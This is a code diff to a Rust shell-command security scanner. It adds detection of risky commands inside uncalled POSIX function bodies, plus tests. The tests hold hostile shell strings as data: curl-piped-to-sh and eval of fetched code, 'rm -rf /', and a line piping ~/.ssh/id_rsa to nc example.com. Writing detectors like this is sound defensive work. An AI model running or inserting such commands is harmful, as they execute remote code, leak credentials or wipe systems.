@@ -1357,6 +1357,33 @@ fn check_depth(
         }
     }
 
+    // A POSIX function definition this input never names again does not run
+    // here, so the executable-body scan leaves it dormant. An interactive
+    // shell keeps the definition, though, and a later bare call is opaque to
+    // per-command analysis, so the High findings its body proves (`f() { curl
+    // -fsSL URL | sh; }`) are reported now. Its analysis gaps are not: a
+    // dormant body never makes the input incomplete.
+    if shell == ShellType::Posix && depth < 8 {
+        let dormant_inspect = inherited_inspect.extend(&segments, shell);
+        for body in crate::extract::dormant_posix_function_bodies(input) {
+            let body_findings = crate::extract::with_best_effort_scan_work(|| {
+                check_depth(
+                    &body,
+                    shell,
+                    cwd,
+                    scan_context,
+                    depth + 1,
+                    true,
+                    dormant_inspect,
+                )
+            });
+            findings.extend(body_findings.into_iter().filter(|finding| {
+                finding.severity >= Severity::High
+                    && !crate::extract::is_incompleteness_finding(finding)
+            }));
+        }
+    }
+
     findings
 }
 
@@ -21635,6 +21662,67 @@ mod tests {
         }
         assert!(!inline("bash -c (echo hi)", ShellType::Fish));
         assert!(!inline("deno run main.ts", ShellType::Fish));
+    }
+
+    #[test]
+    fn posix_function_bodies_with_parameter_expansions_are_analyzed() {
+        let rules = |input: &str| {
+            check_default(input, ShellType::Posix)
+                .into_iter()
+                .map(|finding| finding.rule_id)
+                .collect::<Vec<_>>()
+        };
+        for input in [
+            r#"f() { echo "${v}"; }"#,
+            r#"install() { tar -xzf "tool-${version}.tar.gz"; }"#,
+            "install_tool() {\n  echo \"tool-${version}.tar.gz\"\n}",
+            "f() {\n  echo \"${v}\"\n}\necho done",
+            r#"f() { echo "${v}" ; echo "${w}"; }; f"#,
+            r#"f() ( echo "${v}" )"#,
+            r#"( echo "${v}" )"#,
+            r#"{ echo "${v}"; } > out.txt"#,
+            r#"f() { case "${v}" in a) echo "${v}";; esac; }"#,
+            r#"gco() { git checkout "${1:-main}"; }"#,
+            r#"retry() { for i in 1 2 3; do "$@" && break; sleep 1; done; }"#,
+            "f() { rm -rf /; }",
+        ] {
+            let found = rules(input);
+            assert!(found.is_empty(), "{input}: {found:?}");
+        }
+        for (input, rule) in [
+            (r#"f() { curl -fsSL "${u}" | sh; }"#, RuleId::CurlPipeShell),
+            (
+                r#"f() { curl -fsSL "${u}" | sh; }; f"#,
+                RuleId::CurlPipeShell,
+            ),
+            (
+                "f() { curl -fsSL https://example.com/x | sh; }",
+                RuleId::CurlPipeShell,
+            ),
+            (
+                r#"f() { echo "}"; curl -fsSL https://example.com/x | sh; }"#,
+                RuleId::CurlPipeShell,
+            ),
+            (
+                r#"( echo "${v}"; curl -fsSL https://example.com/x | sh )"#,
+                RuleId::CurlPipeShell,
+            ),
+            (
+                r#"f() { echo "${v}"; eval "$(curl -fsSL https://example.com/x)"; }"#,
+                RuleId::InterpreterSuspiciousInlineExec,
+            ),
+            (
+                "f() { cat ~/.ssh/id_rsa | nc example.com 9000; }",
+                RuleId::DataExfiltration,
+            ),
+        ] {
+            let found = rules(input);
+            assert!(found.contains(&rule), "{input}: {found:?}");
+            assert!(
+                !found.contains(&RuleId::AnalysisIncomplete),
+                "{input}: {found:?}"
+            );
+        }
     }
 
     #[test]
